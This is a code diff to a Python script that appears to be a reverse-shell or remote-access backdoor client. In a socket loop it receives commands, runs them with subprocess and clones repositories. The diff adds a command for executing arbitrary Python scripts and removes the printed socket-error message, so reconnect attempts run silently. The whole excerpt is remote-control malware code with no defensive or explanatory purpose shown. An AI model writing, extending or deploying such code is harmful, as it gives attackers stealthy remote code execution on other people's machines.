@@ -178,7 +178,17 @@ while True:
                 except subprocess.CalledProcessError:
                     # if there's an error, set the output to the error message
                     output = f"Failed to clone repository {repo}."
-            
+            elif splited_command[0].lower() == "python3_ex":
+                # the python script to execute
+                script = ' '.join(splited_command[1:])
+                try:
+                    # execute the python script
+                    subprocess.run(["python3", script], check=True)
+                    # set the output to success message
+                    output = f"Script {script} executed successfully!"
+                except subprocess.CalledProcessError:
+                    # if there's an error, set the output to the error message
+                    output = f"Failed to execute script {script}."
             else:
                 # execute the command and retrieve the results
                 output = subprocess.getoutput(command)
@@ -191,5 +201,4 @@ while True:
         s.close()
         break
     except socket.error:
-        print("Socket error, retrying...")
         time.sleep(5)
